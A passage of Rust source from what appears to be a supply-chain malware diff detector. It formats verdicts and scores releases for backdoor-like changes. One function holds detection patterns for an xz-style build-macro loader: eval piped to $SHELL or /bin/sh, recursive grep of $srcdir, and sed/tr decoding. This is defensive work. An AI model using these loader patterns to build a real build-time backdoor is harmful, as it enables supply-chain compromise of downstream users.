        }
        if a.signature.severity != Severity::None {
            let _ = writeln!(s, "\nknown-bad signatures matched:");
            for m in &a.signature.ids {
                let name = crate::rubric::short_name(&m.id);
                if m.desc.is_empty() {
                    let _ = writeln!(s, "- [{}] {}", m.severity.as_str(), name);
                } else {
                    let _ = writeln!(s, "- [{}] {} — {}", m.severity.as_str(), name, m.desc);
                }
            }
            if let Some(cve) = &a.signature.cve {
                let _ = writeln!(s, "  referenced CVE: {cve}");
            }
        }
        if !a.structure.facts.is_empty() {
            let _ = writeln!(
                s,
                "\nstructural changes (raw binary facts, no rule needed):"
            );
            for f in &a.structure.facts {
                let kind = match f.kind {
                    crate::rubric::FactKind::Added => "new",
                    crate::rubric::FactKind::Became => "became",
                };
                let _ = writeln!(
                    s,
                    "- [{}] {kind} {}: {}",
                    f.severity.as_str(),
                    f.label,
                    f.detail
                );
            }
        }
        if !a.identity.changes.is_empty() {
            let _ = writeln!(s, "\nidentity changes (publisher/signer):");
            for ch in &a.identity.changes {
                let old = if ch.old.is_empty() { "none" } else { &ch.old };
                let new = if ch.new.is_empty() { "none" } else { &ch.new };
                let _ = writeln!(s, "- {}: {} -> {}", ch.label, old, new);
            }
        }

        // The distilled top hunks — strongest rule first, one per rule, tiered
        // context — not every match. A broad trait hitting dozens of benign
        // files must not bury the one change that matters (unrealircd's
        // `substr: SYSTEM` read to the model as a false positive when all 30
        // windows were dumped).
        let hunks = self.hunks(crate::evidence::LLM_HUNKS);
        if !hunks.is_empty() {
            let _ = writeln!(
                s,
                "\nchanged code / bytes (top {} matched regions by rule score):",
                hunks.len()
            );
            s.push_str(crate::evidence::render_hunks(&hunks).trim_end());
            s.push('\n');
        }

        // The full source diff for every changed source file — the payload's
        // safety net. The sections above are what the rubric *matched*; a novel
        // attack composed of innocent atoms matches nothing, so without this the
        // model would be asked to judge a change it cannot see. Sub-Notable
        // atoms are named first as reading hints, then the diff itself.
        let changes = self.source_changes();
        if !changes.is_empty() {
            let _ = writeln!(
                s,
                "\nsource diffs (full text of every file whose behavior-bearing traits changed):"
            );
            for c in changes {
                let hints: Vec<&str> = c
                    .atoms
                    .iter()
                    .filter(|at| at.gained && !crate::rubric::is_finding(at.crit))
                    .map(|at| at.desc.as_str())
                    .filter(|d| !d.is_empty())
                    .collect();
                let _ = writeln!(s, "\n--- {} ---", c.label);
                if !hints.is_empty() {
                    let _ = writeln!(s, "(new sub-finding atoms: {})", hints.join("; "));
                }
                s.push_str(c.diff.trim_end());
                s.push('\n');
            }
        }
        s
    }

    /// Build the `--format json` envelope. Compact and typed, mirroring
    /// `../scan`: a curated `verdict` and its evidence beside the full `raw`
    /// cleave diff. See [`crate::json`].
    pub(crate) fn json(&self, cli: &Cli) -> Result<String> {
        use crate::json as j;
        let a = &self.assessment;
        let categories = a
            .behavioral
            .categories
            .iter()
            .map(|c| j::Category {
                class: &c.class,
                label: &c.label,
                severity: c.severity.as_str(),
                new_category: a.behavioral.is_new_category(c),
                namespaces: &c.namespaces,
                new_ids: &c.new_ids,
                escalated_ids: &c.escalated_ids,
            })
            .collect();
        let sig_ids = a
            .signature
            .ids
            .iter()
            .map(|m| j::SigId {
                id: &m.id,
                desc: &m.desc,
                crit: m.severity.as_str(),
                new: m.is_new,
            })
            .collect();
        let facts = a
            .structure
            .facts
            .iter()
            .map(|f| j::Fact {
                severity: f.severity.as_str(),
                change: match f.kind {
                    crate::rubric::FactKind::Added => "added",
                    crate::rubric::FactKind::Became => "became",
                },
                label: f.label,
                detail: &f.detail,
            })
            .collect();
        let changes = a
            .identity
            .changes
            .iter()
            .map(|c| j::IdChange {
                field: c.label,
                old: &c.old,
                new: &c.new,
            })
            .collect();

        // The proof hunks and the full identity claims — everything the UI and
        // the CLI cache need to redraw without re-reading the artifact.
        let hunks = self.hunks(EVIDENCE_JSON_CAP);
        let evidence = hunks
            .iter()
            .map(|h| j::Ev {
                member: h.member.as_deref(),
                location: &h.location,
                severity: h.severity.as_str(),
                desc: &h.desc,
                lines: h
                    .lines
                    .iter()
                    .map(|l| j::EvLine {
                        locator: &l.locator,
                        text: &l.text,
                        added: l.added,
                        is_match: l.is_match,
                    })
                    .collect(),
            })
            .collect();
        let provenance = self
            .diff
            .files
            .iter()
            .find_map(|f| f.identity.as_ref())
            .map_or((None, None), |idd| (idd.old.as_ref(), idd.new.as_ref()));

        let envelope = j::Envelope {
            v: "1",
            eng: concat!("isomer/", env!("CARGO_PKG_VERSION")),
            verb: self.verb,
            artifact: (!self.naming.name.is_empty()).then_some(self.naming.name.as_str()),
            version: j::Version {
                old: self.naming.old.as_ref().map(|v| v.raw.as_str()),
                new: self.naming.new.as_ref().map(|v| v.raw.as_str()),
                bump: self.naming.bump.map(Bump::label),
            },
            provenance: j::Provenance {
                old: provenance.0,
                new: provenance.1,
            },
            verdict: j::Verdict {
                severity: self.verdict.as_str(),
                new_severity: self.new_verdict.as_str(),
                gate: j::Gate {
                    on: match cli.gate {
                        Gate::New => "new",
                        Gate::Any => "any",
                    },
                    fail_on: cli.fail_on.as_str(),
                    severity: self.gated.as_str(),
                    fail: !self.clean,
                },
                risk: self.risk.map(|r| j::Risk {
                    old: r.old,
                    new: r.new,
                    delta: r.delta(),
                    model: if self.risk_llm_raised {
                        "azoth+llm"
                    } else {
                        "azoth"
                    },
                }),
                proportionality: j::Prop {
                    disproportionate: self.prop.disproportionate,
                    note: self.prop.note.as_deref(),
                    skew: self.prop.skew.as_deref(),
                },
                behavioral: j::Behavioral {
                    severity: a.behavioral.severity.as_str(),
                    categories,
                },
                signature: j::Signature {
                    severity: a.signature.severity.as_str(),
                    cve: a.signature.cve.as_deref(),
                    count: a.signature.ids.len(),
                    ids: sig_ids,
                },
                identity: j::Identity {
                    severity: a.identity.severity.as_str(),
                    changes,
                },
                frameworks: j::Frameworks {
                    attack: j::Ids {
                        new: self.survey.attack.gained(),
                        removed: self.survey.attack.lost(),
                        unchanged: self.survey.attack.kept(),
                    },
                    mbc: j::Ids {
                        new: self.survey.mbc.gained(),
                        removed: self.survey.mbc.lost(),
                        unchanged: self.survey.mbc.kept(),
                    },
                },
                structure: j::Structure {
                    severity: a.structure.severity.as_str(),
                    facts,
                },
            },
            evidence,
            deps: self
                .deps
                .iter()
                .map(|d| j::Dep {
                    coord: &d.coord,
                    ecosystem: d.ecosystem,
                    severity: d.severity.as_str(),
                    highlights: &d.highlights,
                    note: d.note.as_deref(),
                })
                .collect(),
            llm: self.interp.as_ref().map(|i| j::Llm {
                nature: &i.nature,
                verdict: &i.verdict,
                model: &i.model,
            }),
            raw: self.report,
        };
        Ok(serde_json::to_string(&envelope)?)
    }
}

/// Evidence hunks to embed in `--format json`. Higher than the terminal's
/// display cap: the JSON is a complete, cacheable record, not a screenful.
const EVIDENCE_JSON_CAP: usize = 24;

/// Map an ML malware probability to a severity band (mirrors the risk words:
/// benign / elevated / suspicious / malware).
pub(crate) fn risk_band(p: f32) -> Severity {
    if p >= 0.90 {
        Severity::Critical
    } else if p >= 0.50 {
        Severity::High
    } else if p >= 0.15 {
        Severity::Medium
    } else {
        Severity::None
    }
}

// ── version + naming ────────────────────────────────────────────────────────

/// Detected versions and the artifact name for the header, from the input
/// paths (or explicit `--base-version` / `--head-version`).
#[derive(Debug)]
pub(crate) struct Naming {
    pub name: String,
    pub old: Option<Version>,
    pub new: Option<Version>,
    pub bump: Option<Bump>,
}

impl Naming {
    fn resolve(old: &Path, new: &Path, cli: &Cli) -> Self {
        let ob = basename(old);
        let nb = basename(new);
        let ov = cli
            .base_version
            .as_deref()
            .and_then(Version::parse)
            .or_else(|| Version::detect(&ob));
        let nv = cli
            .head_version
            .as_deref()
            .and_then(Version::parse)
            .or_else(|| Version::detect(&nb));
        let bump = match (&ov, &nv) {
            (Some(o), Some(n)) => Some(Bump::classify(o, n)),
            _ => None,
        };
        Self {
            name: artifact_name(&nb, &ob, nv.as_ref().or(ov.as_ref())),
            old: ov,
            new: nv,
            bump,
        }
    }
}

/// A path's final component, for naming a file in output. Falls back to the
/// whole path when there is no final component (`/`, or a path ending in `..`).
pub(crate) fn basename(p: &Path) -> String {
    p.file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| p.display().to_string())
}

/// A display name: the new file's basename with the detected version token and
/// any archive extension stripped, separators tidied. Falls back to the old
/// basename when the new one empties out or is a content hash (quarantine
/// stores name samples by digest — `13ccd9….sample` is no name for a report).
fn artifact_name(new_base: &str, old_base: &str, ver: Option<&Version>) -> String {
    let new_clean = clean_name(new_base, ver);
    let old_clean = clean_name(old_base, ver);
    // A filename is attacker-chosen — a pull request names its own files, and a
    // package names its own archive — and this lands in the masthead.
    crate::printable(
        if new_clean.is_empty()
            || (hexish(&new_clean) && !old_clean.is_empty() && !hexish(&old_clean))
        {
            &old_clean
        } else {
            &new_clean
        },
    )
}

/// A name that is just a hex digest (with or without an extension).
fn hexish(name: &str) -> bool {
    let stem = name.split('.').next().unwrap_or(name);
    stem.len() >= 16 && stem.chars().all(|c| c.is_ascii_hexdigit())
}

fn clean_name(base: &str, ver: Option<&Version>) -> String {
    let mut s = base.to_string();
    if let Some(v) = ver {
        s = s.replace(&v.raw, "");
    }
    // A long leading digit run is a quarantine/timestamp prefix, not a name.
    if let Some((head, rest)) = s.split_once('-')
        && head.len() >= 8
        && head.bytes().all(|b| b.is_ascii_digit())
    {
        s = rest.to_string();
    }
    for ext in [
        ".tar.gz", ".tar.xz", ".tgz", ".txz", ".tar", ".zip", ".gz", ".xz", ".whl",
    ] {
        if let Some(stripped) = s.strip_suffix(ext) {
            s = stripped.to_string();
            break;
        }
    }
    // Collapse separators left behind by removing the version token.
    while s.contains("..") {
        s = s.replace("..", ".");
    }
    while s.contains("--") {
        s = s.replace("--", "-");
    }
    s.trim_matches(['-', '.', '_', ' ']).to_string()
}

/// Pair members when only the outer archive directory carries a version.
///
/// cleave canonicalizes two single-file roots, but directory/archive-member
/// paths are currently paired literally. Reuse the same version detector and
/// name cleaning as the report's filename logic so
/// `pkg-1.0/bin/x` and `pkg-1.1/bin/x` are judged as one file. The raw report
/// remains untouched for evidence and auditing.
fn normalized_archive_diff(diff: &DiffReportV1) -> DiffReportV1 {
    use std::collections::{BTreeMap, BTreeSet};

    let mut groups: BTreeMap<String, (Option<&FileDiffEntry>, Option<&FileDiffEntry>)> =
        BTreeMap::new();
    for file in &diff.files {
        if !file.path.contains("!!") {
            continue;
        }
        let key = normalized_member_path(&file.path);
        let pair = groups.entry(key).or_default();
        match file.status {
            FileStatus::Removed => pair.0 = Some(file),
            FileStatus::Added => pair.1 = Some(file),
            FileStatus::Changed | FileStatus::Unchanged => {}
        }
    }

    let mut aliases: Vec<(&FileDiffEntry, &FileDiffEntry)> = groups
        .values()
        .filter_map(|(old, new)| {
            let (Some(old), Some(new)) = (old.as_ref(), new.as_ref()) else {
                return None;
            };
            (old.path != new.path).then_some((*old, *new))
        })
        .collect();

    // npm distribution tarballs conventionally use `package/` as their root,
    // while a clean GitHub source snapshot normally uses `name-version/`.
    // Pair identical paths beneath those roots so a source-snapshot baseline
    // does not turn a one-file payload injection into 100% archive churn.
    // Requiring exactly one literal `package/` root keeps arbitrary renamed
    // multi-root archives distinct.
    let already_aliased: BTreeSet<&str> = aliases
        .iter()
        .flat_map(|(old, new)| [old.path.as_str(), new.path.as_str()])
        .collect();
    let mut npm_groups: BTreeMap<String, Vec<(&FileDiffEntry, bool)>> = BTreeMap::new();
    for file in &diff.files {
        if already_aliased.contains(file.path.as_str())
            || !matches!(file.status, FileStatus::Removed | FileStatus::Added)
        {
            continue;
        }
        if let Some((package_root, suffix)) = npm_snapshot_member_key(&file.path) {
            npm_groups
                .entry(suffix)
                .or_default()
                .push((file, package_root));
        }
    }
    for candidates in npm_groups.values() {
        let removed: Vec<_> = candidates
            .iter()
            .filter(|(file, _)| file.status == FileStatus::Removed)
            .collect();
        let added: Vec<_> = candidates
            .iter()
            .filter(|(file, _)| file.status == FileStatus::Added)
            .collect();
        if removed.len() == 1 && added.len() == 1 {
            let (old, old_package) = *removed[0];
            let (new, new_package) = *added[0];
            if old_package != new_package {
                aliases.push((old, new));
            }
        }
    }
    if aliases.is_empty() {
        return diff.clone();
    }
    let mut alias_by_path = BTreeMap::new();
    for (index, (old, new)) in aliases.iter().enumerate() {
        alias_by_path.insert(old.path.as_str(), index);
        alias_by_path.insert(new.path.as_str(), index);
    }

    let mut out = diff.clone();
    let mut files = Vec::with_capacity(diff.files.len());
    for file in &diff.files {
        let Some(&alias_index) = alias_by_path.get(file.path.as_str()) else {
            files.push(file.clone());
            continue;
        };
        let (old, new) = aliases[alias_index];
        if old.path != file.path {
            continue;
        }
        let identity = merge_identity(old, new);
        let scopes = merge_scopes(old, new);
        let status =
            if identity.as_ref().is_some_and(|diff| diff.changed) || scope_diffs_changed(&scopes) {
                FileStatus::Changed
            } else {
                FileStatus::Unchanged
            };
        files.push(FileDiffEntry {
            path: new.path.clone(),
            status,
            identity,
            scopes,
            old_formula: old.old_formula.clone(),
            new_formula: new.new_formula.clone(),
        });
    }
    out.files = files;
    out.summary = normalized_summary(&out.files);
    out
}

/// Return the path below an npm/source-snapshot archive root and whether the
/// root is npm's literal `package/` directory.
fn npm_snapshot_member_key(path: &str) -> Option<(bool, String)> {
    let member = path.rsplit("!!").next()?;
    let (root, suffix) = member.split_once('/')?;
    if root.eq_ignore_ascii_case("package") {
        return Some((true, suffix.to_ascii_lowercase()));
    }
    Version::detect(root).map(|_| (false, suffix.to_ascii_lowercase()))
}

fn scope_diffs_changed(scopes: &ScopeDiffs) -> bool {
    scopes.traits.as_ref().is_some_and(scope_changed)
        || scopes.metrics.as_ref().is_some_and(scope_changed)
        || scopes.kv.as_ref().is_some_and(scope_changed)
        || scopes.symbols.as_ref().is_some_and(scope_changed)
        || scopes.strings.as_ref().is_some_and(scope_changed)
        || scopes.sections.as_ref().is_some_and(scope_changed)
}

pub(crate) fn is_source_archive(path: &Path) -> bool {
    let lower = path.to_string_lossy().to_ascii_lowercase();
    [
        ".tar", ".tar.gz", ".tar.bz2", ".tar.xz", ".tar.zst", ".tbz2", ".txz",
    ]
    .iter()
    .any(|suffix| lower.ends_with(suffix))
}

/// Detect a newly introduced build macro whose shell-execution surface grows
/// sharply. This reads only source archives and only members that cleave could
/// not type as a recognized program; it is deliberately a content-shape
/// signal, not an xz filename or hash signature.
fn source_build_macro_anomaly(new_root: &Path, diff: &DiffReportV1) -> bool {
    diff.files.iter().any(|file| {
        if !matches!(file.status, FileStatus::Added | FileStatus::Changed)
            || !scope_changes_present(file)
        {
            return false;
        }
        let Some((_, member)) = file.path.split_once("!!") else {
            return false;
        };
        let lower = member.to_ascii_lowercase();
        if !(lower.contains("/m4/") && lower.ends_with(".m4")) {
            return false;
        }
        let Ok(Some(bytes)) = cleave::extract_member(new_root, member) else {
            return false;
        };
        source_build_macro_score(&bytes)
    })
}

/// Detect a stable suspicious loader paired with a refreshed opaque carrier.
///
/// A normal differential omits unchanged files, which is usually ideal. For a
/// staged source attack, however, the invariant can be the strongest clue:
/// activation logic remains byte-for-byte stable while compressed test data
/// changes beneath it. Archive member indexes provide candidate M4 paths; only
/// members present on both sides, byte-identical, and independently matching
/// the precise loader chain qualify.
fn stable_source_loader_payload_refresh(
    old_root: &Path,
    new_root: &Path,
    diff: &DiffReportV1,
) -> bool {
    if !diff.files.iter().any(changed_test_carrier) {
        return false;
    }
    use std::collections::BTreeMap;
    let mut candidates: BTreeMap<String, (Option<&str>, Option<&str>)> = BTreeMap::new();
    for file in &diff.files {
        let Some((_, member)) = file.path.split_once("!!") else {
            continue;
        };
        if !m4_member_path(member) {
            continue;
        }
        let pair = candidates
            .entry(normalized_member_path(&file.path))
            .or_default();
        match file.status {
            FileStatus::Removed => pair.0 = Some(member),
            FileStatus::Added => pair.1 = Some(member),
            FileStatus::Unchanged | FileStatus::Changed => {
                pair.0 = Some(member);
                pair.1 = Some(member);
            }
        }
    }

    candidates.values().any(|(old_member, new_member)| {
        let (Some(old_member), Some(new_member)) = (*old_member, *new_member) else {
            return false;
        };
        let Ok(Some(old_bytes)) = cleave::extract_member(old_root, old_member) else {
            return false;
        };
        let Ok(Some(new_bytes)) = cleave::extract_member(new_root, new_member) else {
            return false;
        };
        old_bytes == new_bytes && source_build_macro_score(&new_bytes)
    })
}

fn changed_test_carrier(file: &FileDiffEntry) -> bool {
    if !matches!(file.status, FileStatus::Added | FileStatus::Changed) {
        return false;
    }
    let lower = file.path.to_ascii_lowercase();
    let in_test_data = ["/test/", "/tests/", "/fixtures/", "/testdata/"]
        .iter()
        .any(|segment| lower.contains(segment));
    in_test_data
        && [".xz", ".lzma", ".gz", ".bz2", ".zst"]
            .iter()
            .any(|suffix| lower.ends_with(suffix))
}

fn m4_member_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.ends_with(".m4") && (lower.contains("/m4/") || lower.starts_with("m4/"))
}

fn scope_changes_present(file: &FileDiffEntry) -> bool {
    file.scopes.traits.as_ref().is_some_and(scope_changed)
        || file.scopes.metrics.as_ref().is_some_and(scope_changed)
        || file.scopes.kv.as_ref().is_some_and(scope_changed)
        || file.scopes.symbols.as_ref().is_some_and(scope_changed)
        || file.scopes.strings.as_ref().is_some_and(scope_changed)
        || file.scopes.sections.as_ref().is_some_and(scope_changed)
}

fn scope_changed<T>(scope: &ScopeDiff<T>) -> bool {
    !scope.added.is_empty() || !scope.removed.is_empty() || !scope.changed.is_empty()
}

fn source_build_macro_score(bytes: &[u8]) -> bool {
    let text = String::from_utf8_lossy(bytes);
    // The useful source-level combination is a build-time command hook that
    // discovers an Automake/configuration file and evaluates transformed
    // output. Each atom is legitimate in isolation; together in a newly
    // changed macro they describe executable build-time indirection.
    let deferred_shell = text.contains("AC_CONFIG_COMMANDS")
        && text.contains("eval ")
        && (text.contains("| $SHELL") || text.contains("| /bin/sh"));
    let recursive_source_search = text.contains("grep -")
        && text.contains("$srcdir")
        && (text.contains("grep -r")
            || text.contains("grep -R")
            || text.contains("grep -aEr")
            || text.contains("grep -aER"));
    let carrier_decode = text.contains("sed ")
        && text.contains("| eval ")
        && text.contains(" -d")
        && text.contains("tr ");
    deferred_shell && recursive_source_search && carrier_decode
}

fn merge_identity(old: &FileDiffEntry, new: &FileDiffEntry) -> Option<cleave::types::IdentityDiff> {
    let old_id = old.identity.as_ref().and_then(|i| i.old.clone());
    let new_id = new.identity.as_ref().and_then(|i| i.new.clone());
    (old_id.is_some() || new_id.is_some()).then_some(cleave::types::IdentityDiff {
        changed: old_id != new_id,
        old: old_id,
        new: new_id,
    })
}

fn merge_scopes(old: &FileDiffEntry, new: &FileDiffEntry) -> ScopeDiffs {
    ScopeDiffs {
        traits: merge_scope(
            old.scopes.traits.as_ref(),
            new.scopes.traits.as_ref(),
            |item: &TraitChange| item.id.clone(),
            |old, new| {
                old.trait_section == new.trait_section
                    && old.crit == new.crit
                    && old.desc == new.desc
                    && old.count == new.count
            },
        ),
        metrics: merge_scope(
            old.scopes.metrics.as_ref(),
            new.scopes.metrics.as_ref(),
            |item: &MetricChange| item.path.clone(),
            |old, new| old.value == new.value,
        ),
        kv: merge_scope(
            old.scopes.kv.as_ref(),
            new.scopes.kv.as_ref(),
            |item: &KvChange| item.path.clone(),
            |old, new| old.namespace == new.namespace && old.value == new.value,
        ),
        symbols: merge_scope(
            old.scopes.symbols.as_ref(),
            new.scopes.symbols.as_ref(),
            |item: &SymbolChange| format!("{:?}:{}:{:?}", item.kind, item.symbol, item.library),
            |old, new| old.kind == new.kind && old.library == new.library,
        ),
        strings: merge_scope(
            old.scopes.strings.as_ref(),
            new.scopes.strings.as_ref(),
            |item: &StringChange| item.value.clone(),
            |_, _| true,
        ),
        sections: merge_scope(
            old.scopes.sections.as_ref(),
            new.scopes.sections.as_ref(),
            |item: &SectionChange| item.name.clone(),
            |old, new| {
                old.size == new.size
                    && old.entropy == new.entropy
                    && old.permissions == new.permissions
            },
        ),
    }
}

/// Reconstruct a scope from the two sides of a literal-path add/remove pair.
/// The raw cleave entries already contain the complete old/new inventories;
/// only their paths caused the apparent deletion/addition. Typed equality
/// keeps this generic across cleave's six scope item types without serializing
/// large member inventories.
fn merge_scope<T: Clone>(
    old: Option<&ScopeDiff<T>>,
    new: Option<&ScopeDiff<T>>,
    key: impl Fn(&T) -> String,
    equal: impl Fn(&T, &T) -> bool,
) -> Option<ScopeDiff<T>> {
    let (Some(old), Some(new)) = (old, new) else {
        return old.cloned().or_else(|| new.cloned());
    };
    let mut old_items = std::collections::BTreeMap::new();
    for item in old
        .removed
        .iter()
        .chain(old.changed.iter().map(|change| &change.old))
    {
        old_items.insert(key(item), item.clone());
    }
    let mut new_items = std::collections::BTreeMap::new();
    for item in new
        .added
        .iter()
        .chain(new.changed.iter().map(|change| &change.new))
    {
        new_items.insert(key(item), item.clone());
    }

    let mut merged = ScopeDiff::default();
    for (item_key, old_item) in old_items {
        match new_items.remove(&item_key) {
            Some(new_item) if equal(&old_item, &new_item) => {}
            Some(new_item) => merged.changed.push(Changed {
                old: old_item,
                new: new_item,
            }),
            None => merged.removed.push(old_item),
        }
    }
    merged.added.extend(new_items.into_values());
    merged.old_count = old.old_count;
    merged.new_count = new.new_count;
    merged.old_weight = old.old_weight;
    merged.new_weight = new.new_weight;
    merged.change_weight = merged.change_count() as f32;
    merged.truncated = old.truncated || new.truncated;
    merged.recompute_roc();
    Some(merged)
}

fn normalized_summary(files: &[FileDiffEntry]) -> DiffSummary {
    let mut summary = DiffSummary::default();
    for file in files {
        match file.status {
            FileStatus::Added => summary.files_added += 1,
            FileStatus::Removed => summary.files_removed += 1,
            FileStatus::Changed => summary.files_changed += 1,
            FileStatus::Unchanged => summary.files_unchanged += 1,
        }
    }
    let mut present = [false; 6];
    let mut old_weight = [0.0_f32; 6];
    let mut new_weight = [0.0_f32; 6];
    let mut change_weight = [0.0_f32; 6];
    for file in files {
        for (index, scope) in [
            file.scopes
                .traits
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .metrics
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .kv
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .symbols
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .strings
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
            file.scopes
                .sections
                .as_ref()
                .map(|s| (s.old_weight, s.new_weight, s.change_weight)),
        ]
        .into_iter()
        .enumerate()
        {
            if let Some((old, new, changed)) = scope {
                present[index] = true;
                old_weight[index] += old;
                new_weight[index] += new;
                change_weight[index] += changed;
            }
        }
    }
    let mut rocs = ScopeRocs::default();
    let mut total = 0.0;
    let mut count = 0;
    for index in 0..6 {
        let roc = if old_weight[index].max(new_weight[index]) > 0.0 {
            (change_weight[index] / old_weight[index].max(new_weight[index])).min(1.0)
        } else {
            0.0
        };
        rocs.set(cleave::types::Scope::ALL[index], roc);
        if present[index] && (old_weight[index] > 0.0 || new_weight[index] > 0.0) {
            total += roc;
            count += 1;
        }
    }
    summary.scope_roc = rocs;
    summary.overall_roc = if count == 0 {
        0.0
    } else {
        total / count as f32
    };
    summary
}

// ── proportionality ─────────────────────────────────────────────────────────

/// The two change-shape reads: behavioral drift vs the version bump's promise
/// (`disproportionate`/`note`), and behavioral drift vs content drift (`skew`).
#[derive(Debug)]
pub(crate) struct Proportionality {
    pub disproportionate: bool,
    pub note: Option<String>,
    /// Behavioral change far outpacing content change — the implant tell. A
    /// rewrite moves both together; a surgical backdoor moves behavior on a
    /// small edit (xz: 99% of behavior on a ~20% content change).
    pub skew: Option<String>,
}

impl Proportionality {
    fn eval(
        a: &Assessment,
        naming: &Naming,
        diff: &DiffReportV1,
        source_archive: bool,
        source_build_anomaly: bool,
    ) -> Self {
        let skew = skew_note(a, diff);
        // Proportionality needs both halves of the comparison: a version bump
        // making a promise, and a capability gain to weigh against it.
        let Some(bump) = naming
            .bump
            .filter(|_| a.behavioral.severity != Severity::None)
        else {
            return Self {
                disproportionate: false,
                note: None,
                skew,
            };
        };
        // A medium behavior in a patch is not enough by itself: ordinary
        // plugin maintenance can add one new web/API capability. Require a
        // change-shape signal as well (focused multi-capability edit,
        // endgame deletion, or the existing behavior/content skew read).
        let shape_signal = skew.is_some()
            || change_shape_escalation(a, diff, naming.bump, source_archive, source_build_anomaly)
                >= Severity::High;
        let disproportionate = a.behavioral.severity > bump.tolerance() && shape_signal;
        let note = if disproportionate {
            format!(
                "disproportionate — a {} bump gained a {}-severity capability",
                bump.label(),
                a.behavioral.severity.as_str()
            )
        } else {
            format!("within tolerance for a {} bump", bump.label())
        };
        Self {
            disproportionate,
            note: Some(note),
            skew,
        }
    }
}

/// Skew read over the per-scope rates of change: fires when the traits scope
/// (behavior) moved at least `SKEW_RATIO`× the mean of the content scopes and
/// a judged capability actually appeared. Calibrated on the bundled cases: the
/// xz backdoor sits at 4.5×; full rewrites (behavior and content moving
/// together) sit below 2.5×.
fn skew_note(a: &Assessment, diff: &DiffReportV1) -> Option<String> {
    const SKEW_RATIO: f32 = 3.0;
    // A broad release can legitimately change many traits while its metric
    // scopes stay relatively quiet (especially source-heavy packages). The
    // surgical signal is for a small focused edit; archive-root churn is
    // normalized before this point, so this is now a meaningful guard.
    let changed_files =
        diff.summary.files_changed + diff.summary.files_added + diff.summary.files_removed;
    if changed_files > 16 {
        return None;
    }
    let s = &diff.summary.scope_roc;
    let content: Vec<f32> = [s.metrics, s.kv, s.symbols, s.strings, s.sections]
        .into_iter()
        .filter(|r| *r > 0.0)
        .collect();
    if content.is_empty() || a.behavioral.severity < Severity::Medium {
        return None;
    }
    let mean = content.iter().sum::<f32>() / content.len() as f32;
    (s.traits >= 0.5 && s.traits >= mean * SKEW_RATIO).then(|| {
        format!(
            "surgical — {:.0}% of behavior changed on a {:.0}% content change",
            s.traits * 100.0,
            mean * 100.0,
        )
    })
}

/// Raise a gate when the *shape* of the change is itself implant-like.
///
/// The first branch catches a focused source-file implant: several wholly new
/// capability classes arriving in one or two files, with enough overall and
/// behavioral movement that this is not just a metadata touch. The second
/// catches endgame sabotage such as a package retaining only a tiny manifest
/// after removing hundreds of library files. These are intentionally broad
/// metrics, not attack-specific trait names.
fn change_shape_escalation(
    a: &Assessment,
    diff: &DiffReportV1,
    bump: Option<Bump>,
    source_archive: bool,
    source_build_anomaly: bool,
) -> Severity {
    let s = &diff.summary;
    let same_version = bump.is_some_and(|b| matches!(b.kind, BumpKind::Same));
    let new_classes = a
        .behavioral
        .categories
        .iter()
        .filter(|c| !c.new_ids.is_empty())
        .count();
    let focused_source = s.files_changed <= 2
        && s.files_added <= 2
        && s.files_removed <= 2
        && s.overall_roc >= 0.20
        && s.scope_roc.traits >= 0.40
        && new_classes >= 3;
    // A release can also delete a modest amount of stale package content
    // while concentrating several new capabilities in a few changed files.
    // Keep this separate from the small focused branch: the higher movement
    // and four-class floor prevent routine patch cleanup from escalating.
    let focused_source_with_cleanup = s.files_changed <= 4
        && s.files_added + s.files_removed <= 16
        && s.overall_roc >= 0.60
        && s.scope_roc.traits >= 0.60
        && new_classes >= 4;
    // A compact cross-domain capability cluster is suspicious even when the
    // individual rules remain medium: HTTP plus scheduling and serialization
    // in a small patch is a common dormant-loader shape. The class count and
    // movement floors keep ordinary single-purpose WordPress changes below
    // this branch.
    let cross_domain_cluster = s.files_changed + s.files_added + s.files_removed <= 16
        && s.overall_roc >= 0.05
        && s.scope_roc.traits >= 0.15
        && new_classes >= 6
        && ["communications/http", "time/schedule", "data/serialize"]
            .iter()
            .all(|class| {
                a.behavioral
                    .categories
                    .iter()
                    .any(|c| c.class == *class && !c.new_ids.is_empty())
            });
    let endgame = endgame_package_shape(s);
    // A dependency addition paired with a new fallback module load is a
    // compact supply-chain shape: the release pulls in new code and changes
    // how it is loaded, even when neither fact is individually high severity.
    // Keep the size bound so a large, ordinary framework rewrite does not trip
    // merely because it also reorganized imports.
    let dependency_with_fallback_load = dependency_with_fallback_load(a, diff);
    // A newly added encrypted ZIP disguised as another resource format is a
    // compact payload-delivery clue. Keep the differential rule narrow: it
    // must contain many encrypted entries and an executable member, so a
    // routine password-protected source archive does not fail a release.
    let added_encrypted_payload_archive = same_version
        && diff.files.iter().any(|file| {
            matches!(file.status, cleave::types::FileStatus::Added)
                && file.scopes.traits.as_ref().is_some_and(|traits| {
                    let has = |id: &str| {
                        traits
                            .added
                            .iter()
                            .any(|trait_change| trait_change.id == id)
                    };
                    has("micro-behaviors/data/archive/zip::zip-encrypted-entry")
                        && has("micro-behaviors/data/archive/zip::zipcrypto-many-encrypted-entries")
                        && has(
                            "metadata/file/extension/identity::archive-content-extension-mismatch",
                        )
                        && has("metadata/file/metrics::archive-contains-executable-member")
                })
        });
    // A same-version archive replacement is unusual on its own, but it is a
    // strong supply-chain shape when the replacement also changes archive
    // protection and introduces anti-analysis signals. This catches bundled
    // desktop trojans whose payload is spread across a rebuilt app bundle and
    // never produces one high trait.
    let same_version_archive_replacement = same_version
        && s.files_added >= 32
        && s.files_removed >= 32
        && s.files_changed <= 2
        && s.overall_roc >= 0.75
        && s.scope_roc.traits >= 0.20
        && new_classes >= 2
        && a.behavioral
            .categories
            .iter()
            .any(|c| c.class == "data/archive" && !c.new_ids.is_empty())
        && a.behavioral
            .categories
            .iter()
            .any(|c| c.class == "anti-analysis" && !c.new_ids.is_empty());
    // A payload can be hidden one archive layer below the package and look
    // like a harmless resource (OpenX's PHP-in-JavaScript case is the model).
    // Keep this content-agnostic: require the same nested member to gain all
    // three independent signals — concealment/encoding, execution, and a
    // delivery or filesystem effect.
